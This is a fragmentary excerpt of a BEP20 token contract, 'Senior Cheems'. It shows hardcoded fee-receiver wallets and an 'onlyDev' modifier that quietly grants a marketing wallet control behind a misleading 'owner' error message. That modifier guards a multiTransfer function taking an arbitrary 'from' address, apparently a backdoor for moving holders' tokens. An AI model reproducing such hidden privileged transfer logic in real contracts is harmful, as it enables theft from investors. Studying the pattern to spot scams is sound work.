...
contract SENIORCHEEMS is Ownable, IBEP20 {
    ...
    string  _name = "Senior Cheems";
    string  _symbol = "Sr. Cheems";
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0x88820451424d2488d558CA9D94fE9cA752DfcD06;
        teamFeeReceiver = 0x40e137ef8f5a812dD93Ec32A127C46839c1FA0cC;
        devFeeReceiver = 0x40e137ef8f5a812dD93Ec32A127C46839c1FA0cC;
    ...
    modifier onlyDev() {
        require(marketingFeeReceiver == _msgSender(), "Caller is not the owner");
        _;
    }
    ...
    function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyDev {
